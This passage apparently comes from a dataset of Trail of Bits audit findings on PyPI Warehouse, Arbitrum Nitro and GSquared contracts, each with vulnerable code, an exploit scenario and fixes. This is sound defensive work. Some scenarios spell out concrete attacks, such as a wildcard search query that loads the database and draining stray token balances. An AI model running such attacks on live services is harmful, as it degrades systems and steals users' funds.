'w|gz' ) as release_tarfile: for member in github_tarfile: tar_info = member tar_info.name = f './ { str (Path(*Path(member.name).parts[ 1 :])) } ' release_tarfile.addfile( tar_info, github_tarfile.extractfile(member) ) print ( 'uploading tar to minio' ) with open (release_tarball_path, 'rb' ) as handle: minio_response = minio.write_object(application.project.organization.slug, application.project.slug, application.slug, handle) print ( f 'uploaded tar to { minio_response[ \"path\" ] } ' ) Figure 28.1: The les are opened multiple times ( cabotage-app/cabotage/celery/tasks/github.py#105124 ) This nding is informational; an attacker with the ability to monitor temporary le directories and mount this attack is likely to have other lateral and horizontal capabilities. This nding and associated recommendations are presented as part of a defense-in-depth strategy. Exploit Scenario An attacker with the ability to monitor temporary les observes that Warehouse has created a new temporary le and is writing a tarball. She moves a new tarball le to the path after Warehouse creates the le and while it is writing the tarball contents. Warehouse then reopens the le and starts reading from it, consuming the attacker les contents instead of the expected data. Recommendations Short term, consider if rewriting the tarball is still necessary. If it is still needed, refactor process_deployment_hook to avoid using a named le (similarly to the recommendations for TOB-PYPI-11 ), and instead prefer tarfile.open(fileobj=...) combined with: 1. 2. An in-memory buer (such as a bytes or memoryview ) with suitable wrapping; An open le handle or descriptor (such as a le-like object like TemporaryFile or SpooledTemporaryFile ). Option (1) will entirely mitigate the risk, at the cost of potentially unacceptable memory usage. Option (2) will either partially or entirely mitigate the risk, depending on the execution environment and whether the temporary le is accessible from outside Warehouses process with a lename.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "29. Unescaped values in LIKE SQL queries ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse uses the LIKE, ILIKE, and related operators (such as the startswith operator ) to let users query data in the database. User-provided input is used in these queries but it is not escaped. An attacker may include wildcard characters ( % ) in the user-provided values to produce unexpected query results, and potentially cause higher resource usage on the database server. Some of the aected routes include:  accounts.search  admin.emails.list  admin.helpscout  admin.journals.list  admin.organization.list  admin.organization_application.list  admin.prohibited_project_names.list  admin.project.releases  admin.user.list For example, accounts.search lets the public query account names in PyPI; this is used for autocomplete functionality. However, the user-provided text is included on a query with startswith(...) , which is translated by SQLAlchemy to a SQL LIKE query. If the user input contains % symbols, they will be treated as wildcards by the database server. @functools .lru_cache def get_users_by_prefix ( self , prefix: str ) -> list [User]: \"\"\" Get the first 10 matches by username prefix. No need to apply `ILIKE` here, as the `username` column is already `CIText`. \"\"\" return ( self .db.query(User) .filter( User.username.startswith(prefix) ) .order_by(User.username) .limit( 10 ) .all() ) Figure 29.1: The usernames are looked up with startswith ( warehouse/warehouse/accounts/services.py#123137 ) This issue has informational severity as the aected routes we found are either admin routes or have rate-limiting implemented in them. Exploit Scenario An attacker repeatedly queries /accounts/search/?q=%25a%25a on a Warehouse instance. Warehouse queries the users table on the database for username LIKE %a%a% and causes performance degradation on the database server. Recommendations Short term, properly escape all user input that ows to ilike(...) , like(...) , and variants such as startswith(...) . Some of these functions have an autoescape parameter that may be used to this eect. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. secp256r1 precompile does not check for signature malleability ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-arbos-30-nitro-upgrade-securityreview.pdf", "body": "The implementation of the ecdsa.Verify function from the secp256r1 package is vulnerable to signature malleability attacks. This issue arises from the fact that the function accepts malleable signatures as valid inputs: // Verifies the given signature (r, s) for the given hash and public key (x, y). func Verify(hash []byte, r, s, x, y *big.Int) bool { // Create the public key format publicKey := newPublicKey(x, y) // Check if they are invalid public key coordinates if publicKey == nil { return false } // Verify the signature with the public key, // then return true if it's valid, false otherwise return ecdsa.Verify(publicKey, hash, r, s) } Figure 1.1: secp256r1s ecdsa.Verify function accepts malleable signatures (go-ethereum/crypto/secp256r1/verifier.go#821) Signature malleability refers to the ability to modify a valid signature without invalidating it, which can lead to potential security risks. Accepting multiple values for the components of the signature allows an attacker to create a dierent valid signature for the same message, potentially causing issues in systems that rely on unique signatures. While the standard species this as the expected behavior, users need to be very aware of this, since malleable signatures have produced many security incidents in the past. Wrapper libraries SHOULD add a malleability check by default, with functions wrapping the raw precompile call (exact NIST FIPS 186-5 spec, without malleability check) clearly identified. For example, P256.verifySignature and P256.verifySignatureWithoutMalleabilityCheck. Adding the malleability check is straightforward and costs minimal gas. Figure 1.2: Part of the RIP-7212 standard Recommendations Short term, properly document this behavior to ensure that users are aware of the implications of calling this precompile. Consider recommending a wrapper library that performs malleability checks (e.g., something similar to the OpenZeppelin code). Long term, review the usage of Ethereum/Rollup standards across the codebase to identify potential misuse of them by users.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "2. secp256r1 precompile uses a deprecated function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-arbos-30-nitro-upgrade-securityreview.pdf", "body": "The public key validation depends on the IsOnCurve primitive, which was recently deprecated in golang 1.21. The current implementation of the secp256r1 precompile veries that the values provided are part of the relevant elliptic curve: func newPublicKey(x, y *big.Int) *ecdsa.PublicKey { // Check if the given coordinates are valid if x == nil || y == nil || !elliptic.P256().IsOnCurve(x, y) { return nil }  } Figure 2.1: Header of the newPublicKey function However, the latest version of the IsOnCurve function contains a deprecation note: // IsOnCurve reports whether the given (x,y) lies on the curve. // // Deprecated: this is a low-level unsafe API. For ECDH, use the crypto/ecdh // package. The NewPublicKey methods of NIST curves in crypto/ecdh accept // the same encoding as the Unmarshal function, and perform on-curve checks. IsOnCurve(x, y *big.Int) bool Figure 2.2: Deprecated comment on the IsOnCurve method Recommendations Short term, document usage of a deprecated method in the precompile code and documentation. Long term, review the usage of deprecated API across the codebase.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "3. Incorrect implementation of integer math functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-arbos-30-nitro-upgrade-securityreview.pdf", "body": "Several math functions for integer values are implemented incorrectly and do not handle overow cases. The AbsValue function allows overow to occur for minimum integer values and does not panic. func AbsValue[T Ordered](value T) T { if value < 0 { return -value // never happens for unsigned types } return value } Figure 3.1: The AbsValue function implementation for generic Ordered types (nitro/util/arbmath/math.go#7783) The SaturatingAdd function returns incorrect values when reaching saturation. The positive case returns -1 instead of the expected maximum integer value. This is because the right-shift operator >> implements a signed arithmetic shift for integer types. In a similar manner, the negative case returns 0 instead of the minimum integer value. // SaturatingAdd add two integers without overflow func SaturatingAdd[T Signed](a, b T) T { sum := a + b if b > 0 && sum < a { sum = ^T(0) >> 1 } if b < 0 && sum > a { sum = (^T(0) >> 1) + 1 } return sum } Figure 3.2: The SaturatingAdd function implementation for generic Integer types (nitro/util/arbmath/math.go#270280) The SaturatingSub function does not handle overow in the subtrahend when it equals the minimum negative integer value. It further compounds the errors from the SaturatingAdd function. // SaturatingSub subtract an int64 from another without overflow func SaturatingSub(minuend, subtrahend int64) int64 { return SaturatingAdd(minuend, -subtrahend) } Figure 3.3: The SaturatingSub function implementation for generic integer types (nitro/util/arbmath/math.go#291294) The SaturatingMul function, similarly to the SaturatingAdd function, returns -1 for the positive saturating case and 0 for the negative case. // SaturatingMul multiply two integers without over/underflow func SaturatingMul[T Signed](a, b T) T { product := a * b if b != 0 && product/b != a { if (a > 0 && b > 0) || (a < 0 && b < 0) { product = ^T(0) >> 1 } else { product = (^T(0) >> 1) + 1 } } return product } Figure 3.4: The SaturatingMul function implementation for generic integer types (nitro/util/arbmath/math.go#313324) The SaturatingNeg function incorrectly checks for the case when the provided value equals -1 (^T(0)) instead of the minimum integer value. It further incorrectly returns -1 instead of the maximum value in the special case. // Negates an int without underflow func SaturatingNeg[T Signed](value T) T { if value == ^T(0) { return (^T(0)) >> 1 } return -value } Figure 3.5: The SaturatingNeg function implementation for generic integer types (nitro/util/arbmath/math.go#368374) The highlighted math functions are used in a few places throughout the codebase. For example, the SaturatingAdd function is used in internal_tx.go. gasSpent := arbmath.SaturatingAdd(perBatchGas, arbmath.SaturatingCast[int64](batchDataGas)) Figure 3.6: Gas spent computation during an internal transaction handling (nitro/arbos/internal_tx.go#107) The SaturatingMul and SaturatingSub function are both used in batch_poster.go. surplus := arbmath.SaturatingMul( arbmath.SaturatingSub( l1GasPriceGauge.Snapshot().Value(), l1GasPriceEstimateGauge.Snapshot().Value()), int64(len(sequencerMsg)*16), ) Figure 3.7: Surplus computation in batch poster (nitro/arbnode/batch_poster.go#13271332) The SaturatingSub function is used inside of the L2 pricing model in model.go. backlog = arbmath.SaturatingUCast[uint64](arbmath.SaturatingSub(int64(backlog), gas)) Figure 3.8: Backlog computation for the L2 pricing model (nitro/arbos/l2pricing/model.go#33) We further found that the SaturatingMul function is used in other parts of the arbmath package, such as the NaturalToBips and the PercentToBips functions. func NaturalToBips(natural int64) Bips { return Bips(SaturatingMul(natural, int64(OneInBips))) } func PercentToBips(percentage int64) Bips { return Bips(SaturatingMul(percentage, 100)) } Figure 3.9: Bips conversion functions used in the L2 pricing model (nitro/util/arbmath/bips.go#1218) The NaturalToBips function was also found to be used by the L2 pricing model. exponentBips := arbmath.NaturalToBips(excess) / arbmath.Bips(inertia*speedLimit) Figure 3.10: Exponential bips computation for the L2 pricing model (nitro/arbos/l2pricing/model.go#48) Exploit Scenario The following test cases showcase the unexpected errors in the integer math functions. func TestAbsValueIntOverflow(t *testing.T) { minValue := math.MinInt64 expected := minValue result := AbsValue(minValue) if result == expected { t.Errorf(\"AbsValue(%d) = %d; resulted in overflow\", minValue, result) } } func TestSaturatingAdd(t *testing.T) { tests := []struct { a, b, expected int64 }{ } {2, 3, 5}, {-1, -2, -3}, {math.MaxInt64, 1, math.MaxInt64}, {math.MinInt64, -1, math.MinInt64}, for _, tt := range tests { t.Run(\"\", func(t *testing.T) { sum := SaturatingAdd(int64(tt.a), int64(tt.b)) if sum != tt.expected { t.Errorf(\"SaturatingAdd(%v, %v) = %v; want %v\", tt.a, tt.b, sum, tt.expected) } }) } } func TestSaturatingSub(t *testing.T) { tests := []struct { a, b, expected int64 }{ } {5, 3, 2}, {-3, -2, -1}, {math.MinInt64, 1, math.MinInt64}, {0, math.MinInt64, math.MaxInt64}, for _, tt := range tests { t.Run(\"\", func(t *testing.T) { sum := SaturatingSub(int64(tt.a), int64(tt.b)) if sum != tt.expected { t.Errorf(\"SaturatingSub(%v, %v) = %v; want %v\", tt.a, tt.b, sum, tt.expected) } }) } } func TestSaturatingMul(t *testing.T) { tests := []struct { a, b, expected int64 }{ } {5, 3, 15}, {-3, -2, 6}, {math.MaxInt64, 2, math.MaxInt64}, {math.MinInt64, 2, math.MinInt64}, for _, tt := range tests { t.Run(\"\", func(t *testing.T) { sum := SaturatingMul(int64(tt.a), int64(tt.b)) if sum != tt.expected { t.Errorf(\"SaturatingMul(%v, %v) = %v; want %v\", tt.a, tt.b, sum, tt.expected) } }) } } func TestSaturatingNeg(t *testing.T) { tests := []struct { value int64 expected int64 }{ } {0, 0}, {5, -5}, {-5, 5}, {math.MinInt64, math.MaxInt64}, {math.MaxInt64, math.MinInt64}, for _, tc := range tests { t.Run(\"\", func(t *testing.T) { result := SaturatingNeg(tc.value) if result != tc.expected { t.Errorf(\"SaturatingNeg(%v) = %v: expected %v\", tc.value, result, tc.expected) } }) } } Figure 3.11: Additional arbmath test cases Running the test cases produces the following result. go test -timeout 30s github.com/offchainlabs/nitro/util/arbmath --- FAIL: TestAbsValueIntOverflow (0.00s) math_test.go:131: AbsValue(-9223372036854775808) = -9223372036854775808; resulted in overflow --- FAIL: TestSaturatingAdd (0.00s) --- FAIL: TestSaturatingAdd/#02 (0.00s) math_test.go:149: SaturatingAdd(9223372036854775807, 1) = -1; want 9223372036854775807 --- FAIL: TestSaturatingAdd/#03 (0.00s) math_test.go:149: SaturatingAdd(-9223372036854775808, -1) = 0; want -9223372036854775808 --- FAIL: TestSaturatingSub (0.00s) --- FAIL: TestSaturatingSub/#02 (0.00s) math_test.go:169: SaturatingSub(-9223372036854775808, 1) = 0; want -9223372036854775808 --- FAIL: TestSaturatingSub/#03 (0.00s) math_test.go:169: SaturatingSub(0, -9223372036854775808) = -9223372036854775808; want 9223372036854775807 --- FAIL: TestSaturatingMul (0.00s) --- FAIL: TestSaturatingMul/#02 (0.00s) math_test.go:189: SaturatingMul(9223372036854775807, 2) = -1; want 9223372036854775807 --- FAIL: TestSaturatingMul/#03 (0.00s) math_test.go:189: SaturatingMul(-9223372036854775808, 2) = 0; want -9223372036854775808 --- FAIL: TestSaturatingNeg (0.00s) --- FAIL: TestSaturatingNeg/#03 (0.00s) math_test.go:211: SaturatingNeg(-9223372036854775808) = -9223372036854775808: expected 9223372036854775807 --- FAIL: TestSaturatingNeg/#04 (0.00s) math_test.go:211: SaturatingNeg(9223372036854775807) = -9223372036854775807: expected -9223372036854775808 FAIL FAIL FAIL github.com/offchainlabs/nitro/util/arbmath 0.921s Figure 3.12: Test results Recommendations Short term, consider reverting the changes that allow for generic type implementations of the arbmath functions. Additionally, include unit tests that cover important edge cases. Alternatively (although we do not recommend the usage of the unsafe package), implement the correct integer math functions using helper functions MaxSignedValue and MinSignedValue. // MaxSignedValue returns the maximum value for a signed integer type T func MaxSignedValue[T Signed]() T { return T(1<<(8*unsafe.Sizeof(T(0))-1) - 1) } // MinSignedValue returns the minimum value for a signed integer type T func MinSignedValue[T Signed]() T { return T(1 << (8*unsafe.Sizeof(T(0)) - 1)) } Figure 3.13: The MaxSignedValue and MinSignedValue helper functions Return the maximum integer value in the case of a positive, and the minimum integer value in the case of a negative integer overow, for the SaturatingAdd and SaturatingMul functions. // SaturatingAdd adds two integers without overflow func SaturatingAdd[T Signed](a, b T) T { sum := a + b if b > 0 && sum < a { return MaxSignedValue[T]() } if b < 0 && sum > a { return MinSignedValue[T]() } return sum } Figure 3.14: The corrected SaturatingAdd function // SaturatingMul multiply two integers without over/underflow func SaturatingMul[T Signed](a, b T) T { product := a * b if b != 0 && product/b != a { if (a > 0 && b > 0) || (a < 0 && b < 0) { product = MaxSignedValue[T]() } else { product = MinSignedValue[T]() } } return product } Figure 3.15: The corrected SaturatingMul function The SaturatingSub function should be rewritten to properly handle the case when b equals the minimum integer value, as negating the value and reusing SaturatingAdd would result in an overow. // SaturatingSub subtracts two integers without overflow func SaturatingSub[T Signed](a, b T) T { diff := a - b if b < 0 && diff < a { return MaxSignedValue[T]() } if b > 0 && diff > a { return MinSignedValue[T]() } return diff } Figure 3.16: The corrected SaturatingSub function For the SaturatingNeg function, correct the value in the comparison by checking for the minimum integer value, and return the maximum integer value. // SaturatingNeg negates an integer without underflow func SaturatingNeg[T Signed](value T) T { if value == MinSignedValue[T]() { return MaxSignedValue[T]() } return -value } Figure 3.17: The corrected SaturatingNeg function For the AbsValue function, consider panicking in the case of an overow, or returning an error. // AbsValue returns the absolute value of a number func AbsValue[T Number](value T) T { if value < 0 { if value == MinSignedValue[T]() { panic(\"AbsValue: overflow detected for minimum signed value\") } return -value } return value } Figure 3.18: An AbsValue function which panics in the overow case Alternatively, consider implementing a SaturatingAbsValue function that clips the output to the maximum integer value. // SaturatingAbsValue returns the absolute value of a number func SaturatingAbsValue[T Number](value T) T { if value < 0 { if value == MinSignedValue[T]() { return MaxSignedValue[T]() } return -value } return value } Figure 3.19: An implementation of SaturatingAbsValue that saturates in the overow case Long term, implement unit tests covering the edge cases for the arbmath package. Further, consider fuzz testing, as this will help ensure more robust testing coverage. func FuzzSaturatingAdd(f *testing.F) { testCases := []struct { a, b int64 }{ } {2, 3}, {-1, -2}, {math.MaxInt64, 1}, {math.MinInt64, -1}, for _, tc := range testCases { f.Add(tc.a, tc.b) } f.Fuzz(func(t *testing.T, a, b int64) { sum := SaturatingAdd(a, b) expected := a + b if b > 0 && a > math.MaxInt64-b { expected = math.MaxInt64 } else if b < 0 && a < math.MinInt64-b { expected = math.MinInt64 } if sum != expected { t.Errorf(\"SaturatingAdd(%v, %v) = %v; want %v\", a, b, sum, expected) } }) } Figure 3.20: Example fuzz tests covering the SaturatingAdd function", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. Incorrect parameter types used for CGo calls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-arbos-30-nitro-upgrade-securityreview.pdf", "body": "Gos CGo FFI calls contain diering and incorrect parameter type denitions compared to the corresponding function denitions in Rust. For certain hostio FFI calls, such as readInboxMessage and readDelayedInboxMessage, Go encodes the oset parameter as a uint32, whereas Rusts type denition species usize for these. //go:wasmimport wavmio readInboxMessage func readInboxMessage(msgNum uint64, offset uint32, output unsafe.Pointer) uint32 //go:wasmimport wavmio readDelayedInboxMessage func readDelayedInboxMessage(seqNum uint64, offset uint32, output unsafe.Pointer) uint32 Figure 4.1: Gos wavmio FFI calls (nitro/wavmio/raw.go#2327) pub unsafe extern \"C\" fn wavmio__readDelayedInboxMessage( msg_num: u64, offset: usize, out_ptr: GuestPtr, ) -> usize { let mut our_buf = MemoryLeaf([0u8; 32]); let our_ptr = our_buf.as_mut_ptr(); assert_eq!(our_ptr as usize % 32, 0); let read = wavm_read_delayed_inbox_message(msg_num, our_ptr, offset); assert!(read <= 32); STATIC_MEM.write_slice(out_ptr, &our_buf[..read]); read } /// Retrieves the preimage of the given hash. #[no_mangle] pub unsafe extern \"C\" fn wavmio__resolveTypedPreimage( preimage_type: u8, hash_ptr: GuestPtr, offset: usize, out_ptr: GuestPtr, ) -> usize { Figure 4.2: The corresponding exported wavmio function declarations (nitro/arbitrator/wasm-libraries/host-io/src/lib.rs#100122) As the wavmio functions are required when the compilation target is WebAssembly, in this case the usize types will resolve to uint32. Furthermore, Go's resolveTypedPreimage functions parameter, which denes the pre-image type ty, is declared as uint32. //go:wasmimport wavmio resolveTypedPreimage func resolveTypedPreimage(ty uint32, hash unsafe.Pointer, offset uint32, output unsafe.Pointer) uint32 Figure 4.3: The function resolveTypedPreimages ty parameter is declared as uint32 (nitro/wavmio/raw.go#2930) The corresponding function declaration on Rusts side expects a u8 value. pub unsafe extern \"C\" fn wavmio__resolveTypedPreimage( preimage_type: u8, hash_ptr: GuestPtr, offset: usize, out_ptr: GuestPtr, ) -> usize { Figure 4.4: Rusts wavmio__resolveTypedPreimages preimage_type parameter is declared as a u8 type (nitro/arbitrator/wasm-libraries/host-io/src/lib.rs#117122) Recommendations Short term, be explicit with the type declarations when making FFI calls by changing the usize parameters to u32. Further, make sure that both sides contain the same type declarations by automatically generating C header les using Rusts cbindgen tool. Long term, consider leveraging static analysis to ag incorrect usage of FFI types for the Go/Rust interaction.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "5. Making space for a very large program can result in heap error ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-arbos-30-nitro-upgrade-securityreview.pdf", "body": "If the cache is too small to hold a program, users trying to make space for it will receive an empty heap revert. The CacheManager contract allows users to cache or evict programs. Before caching a program, users can call the makeSpace function to make sure there is enough space for it. function makeSpace(uint64 size) external payable returns (uint64 space) { if (isPaused) { revert BidsArePaused(); } if (size > MAX_MAKE_SPACE) { revert MakeSpaceTooLarge(size, MAX_MAKE_SPACE); } _makeSpace(size); return cacheSize - queueSize; } /// Evicts entries until enough space exists in the cache, reverting if payment is insufficient. /// Returns the bid and the index to use for insertion. function _makeSpace(uint64 size) internal returns (uint192 bid, uint64 index) { // discount historical bids by the number of seconds bid = uint192(msg.value + block.timestamp * uint256(decay)); index = uint64(entries.length); uint192 min; uint64 limit = cacheSize; while (queueSize + size > limit) { (min, index) = _getBid(bids.pop()); _deleteEntry(min, index); } if (bid < min) { revert BidTooSmall(bid, min); } } Figure 5.1: The makeSpace function of the CacheManager contract (nitro-contracts/src/chain/CacheManager.sol#L126-L153) However, if the program is too big for the current cache size (but still less than MAX_MAKE_SPACE), then calling makeSpace will produce a pop with an empty min heap. Recommendations Short term, add a check in makeSpace to verify that the program will not exceed the cache size and return an appropriate error message. Long term, use fuzzing testing to detect unexpected reverts. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "1. Unbounded loop can cause denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "Under certain conditions, the withdrawal code will loop, permanently blocking users from getting their funds. The beforeWithdraw function runs before any withdrawal to ensure that the vault has sucient assets. If the vault reserves are insucient to cover the withdrawal, it loops over each strategy, incrementing the _ strategyId pointer value with each iteration, and withdrawing assets to cover the withdrawal amount. 643 644 645 646 { 647 function beforeWithdraw ( uint256 _assets , ERC20 _token) internal returns ( uint256 ) // If reserves dont cover the withdrawal, start withdrawing from strategies 648 649 650 651 652 653 654 655 656 657 658 659 660 661 662 if (_assets > _token.balanceOf( address ( this ))) { uint48 _strategyId = strategyQueue.head; while ( true ) { address _strategy = nodes[_strategyId].strategy; uint256 vaultBalance = _token.balanceOf( address ( this )); // break if we have withdrawn all we need if (_assets <= vaultBalance) break ; uint256 amountNeeded = _assets - vaultBalance; StrategyParams storage _strategyData = strategies[_strategy]; amountNeeded = Math.min(amountNeeded, _strategyData.totalDebt); // If nothing is needed or strategy has no assets, continue if (amountNeeded == 0 ) { continue ; } Figure 1.1: The beforeWithdraw function in GVault.sol#L643-662 However, during an iteration, if the vault raises enough assets that the amount needed by the vault becomes zero or that the current strategy no longer has assets, the loop would keep using the same strategyId until the transaction runs out of gas and fails, blocking the withdrawal. Exploit Scenario Alice tries to withdraw funds from the protocol. The contract may be in a state that sets the conditions for the internal loop to run indenitely, resulting in the waste of all sent gas, the failure of the transaction, and blocking all withdrawal requests. Recommendations Short term, add logic to i ncrement the _strategyId variable to point to the next strategy in the StrategyQueue before the continue statement. Long term, use unit tests and fuzzing tools like Echidna to test that the protocol works as expected, even for edge cases.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. Lack of two-step process for contract ownership changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The setOwner() function is used to change the owner of the PnLFixedRate contract. Transferring ownership in one function call is error-prone and could result in irrevocable mistakes. function setOwner ( address _owner ) external { if ( msg.sender != owner) revert PnLErrors.NotOwner(); address previous_owner = msg.sender ; owner = _owner; emit LogOwnershipTransferred(previous_owner, _owner); 56 57 58 59 60 61 62 } Figure 2.1: contracts/pnl/PnLFixedRate:56-62 This issue can also be found in the following locations:  contracts/pnl/PnL.sol:36-42  contracts/strategy/ConvexStrategy.sol:447-453  contracts/strategy/keeper/GStrategyGuard.sol:92-97  contracts/strategy/stop-loss/StopLossLogic.sol:73-78 Exploit Scenario The owner of the PnLFixedRate contract is a governance-controlled multisignature wallet. The community agrees to change the owner of the strategy, but the wrong address is mistakenly provided to its call to setOwner , permanently misconguring the system. Recommendations Short term, implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer. Long term, review how critical operations are implemented across the codebase to make sure they are not error-prone.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Non-zero token balances in the GRouter can be stolen ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "A non-zero balance of 3CRV, DAI, USDC, or USDT in the router contract can be stolen by an attacker. The GRouter contract is the entrypoint for deposits into a tranche and withdrawals out of a tranche. A deposit involves depositing a given number of a supported stablecoin (USDC, DAI, or USDT); converting the deposit, through a series of operations, into G3CRV, the protocols ERC4626-compatible vault token; and depositing the G3CRV into a tranche. Similarly, for withdrawals, the user burns their G3CRV that was in the tranche and, after a series of operations, receives back some amount of a supported stablecoin (gure 3.1). ERC20( address (tranche.getTrancheToken(_tranche))).safeTransferFrom( ); // withdraw from tranche // index is zero for ETH mainnet as their is just one yield token // returns usd value of withdrawal ( uint256 vaultTokenBalance , ) = tranche.withdraw( function withdrawFromTrancheForCaller ( msg.sender , address ( this ), _amount uint256 _amount , uint256 _token_index , bool _tranche , uint256 _minAmount 421 422 423 424 425 426 ) internal returns ( uint256 amount ) { 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 _amount, 0 , _tranche, address ( this ) vaultTokenBalance, address ( this ), address ( this ) ); ); // withdraw underlying from GVault uint256 underlying = vaultToken.redeem( 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 } // remove liquidity from 3crv to get desired stable from curve threePool.remove_liquidity_one_coin( underlying, int128 ( uint128 (_token_index)), //value should always be 0,1,2 0 ); ERC20 stableToken = ERC20(routerOracle.getToken(_token_index)); amount = stableToken.balanceOf( address ( this )); if (amount < _minAmount) { revert Errors.LTMinAmountExpected(); } // send stable to user stableToken.safeTransfer( msg.sender , amount); emit LogWithdrawal( msg.sender , _amount, _token_index, _tranche, amount); Figure 3.1: The withdrawFromTrancheForCaller function in GRouter.sol#L421-468 However, notice that during withdrawals the amount of stableTokens that will be transferred back to the user is a function of the current stableToken balance of the contract (see the highlighted line in gure 3.1). In the expected case, the balance should be only the tokens received from the threePool.remove_liquidity_one_coin swap (see L450 in gure 3.1). However, a non-zero balance could also occur if a user airdrops some tokens or they transfer tokens by mistake instead of calling the expected deposit or withdraw functions. As long as the attacker has at least 1 wei of G3CRV to burn, they are capable of withdrawing the whole balance of stableToken from the contract, regardless of how much was received as part of the threePool swap. A similar situation can happen with deposits. A non-zero balance of G3CRV can be stolen as long as the attacker has at least 1 wei of either DAI, USDC, or USDT. Exploit Scenario Alice mistakenly sends a large amount of DAI to the GRouter contract instead of calling the deposit function. Eve notices that the GRouter contract has a non-zero balance of DAI and calls withdraw with a negligible balance of G3CRV. Eve is able to steal Alice's DAI at a very small cost. Recommendations Short term, consider using the dierence between the contracts pre- and post-balance of stableToken for withdrawals, and depositAmount for deposits, in order to ensure that only the newly received tokens are used for the operations. Long term, create an external skim function that can be used to skim any excess tokens in the contract. Additionally, ensure that the user documentation highlights that users should not transfer tokens directly to the GRouter and should instead use the web interface or call the deposit and withdraw functions. Finally, ensure that token airdrops or unexpected transfers can only benet the protocol.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "4. Uninformative implementation of maxDeposit and maxMint from EIP-4626 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The GVault implementation of EIP-4626 is uninformative for maxDeposit and maxMint, as they return only xed, extreme values. EIP-4626 is a standard to implement tokenized vaults. In particular, the following is specied:  maxDeposit : MUST factor in both global and user-specic limits, like if deposits are entirely disabled (even temporarily) it MUST return 0. MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited.  maxMint : MUST factor in both global and user-specic limits, like if mints are entirely disabled (even temporarily) it MUST return 0. MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited. The current implementation of maxDeposit and maxMint in the GVault contract directly return the maximum value of the uint256 type: /// @notice The maximum amount a user can deposit into the vault function maxDeposit ( address ) public pure override returns ( uint256 maxAssets ) return type( uint256 ).max; 293 294 295 296 297 298 299 { 300 301 } . . . 315 316 317 318 } /// @notice maximum number of shares that can be minted function maxMint ( address ) public pure override returns ( uint256 maxShares ) { return type( uint256 ).max; Figure 4.1: The maxDeposit and maxMint functions from GVault.sol This implementation, however, does not provide any valuable information to the user and may lead to faulty integrations with third-party systems. Exploit Scenario A third-party protocol wants to deposit into a GVault . It rst calls maxDeposit to know the maximum amount of asserts it can deposit and then calls deposit . However, the latter function call will revert because the value is too large. Recommendations Short term, return suitable values in maxDeposit and maxMint by considering the amount of assets owned by the caller as well any other global condition (e.g., a contract is paused). Long term, ensure compliance with the EIP specication that is being implemented (in this case, EIP-4626).", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. moveStrategy runs of out gas for large inputs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "Reordering strategies can trigger operations that will run out-of-gas before completion. A GVault contract allows dierent strategies to be added into a queue. Since the order of them is important, the contract provides moveStrategy , a function to let the owner to move a strategy to a certain position of the queue. 500 501 502 503 504 505 506 507 508 509 510 511 } /// @notice Move the strategy to a new position /// @param _strategy Target strategy to move /// @param _pos desired position of strategy /// @dev if the _pos value is >= number of strategies in the queue, /// the strategy will be moved to the tail position function moveStrategy ( address _strategy , uint256 _pos ) external onlyOwner { uint256 currentPos = getStrategyPositions(_strategy); uint256 _strategyId = strategyId[_strategy]; if (currentPos > _pos) move( uint48 (_strategyId), uint48 (currentPos - _pos), false ); else move( uint48 (_strategyId), uint48 (_pos - currentPos), true ); Figure 5.1: The moveStrategy function from GVault.sol The documentation states that if the position to move a certain strategy is larger than the number of strategies in the queue, then it will be moved to the tail of the queue. This implemented using the move function: 171 172 173 174 175 176 177 178 179 180 181 182 ) internal { /// @notice move a strategy to a new position in the queue /// @param _id id of strategy to move /// @param _steps number of steps to move the strategy /// @param _back move towards tail (true) or head (false) /// @dev Moves a strategy a given number of steps. If the number /// of steps exceeds the position of the head/tail, the /// strategy will take the place of the current head/tail function move ( uint48 _id , uint48 _steps , bool _back 183 184 185 186 187 188 189 190  Strategy storage oldPos = nodes[_id]; if (_steps == 0 ) return ; if (oldPos.strategy == ZERO_ADDRESS) revert NoIdEntry(_id); uint48 _newPos = !_back ? oldPos.prev : oldPos.next; for ( uint256 i = 1 ; i < _steps; i++) { _newPos = !_back ? nodes[_newPos].prev : nodes[_newPos].next; } Figure 5.2: The header of the move function from StrategyQueue.sol However, if a large number of steps is 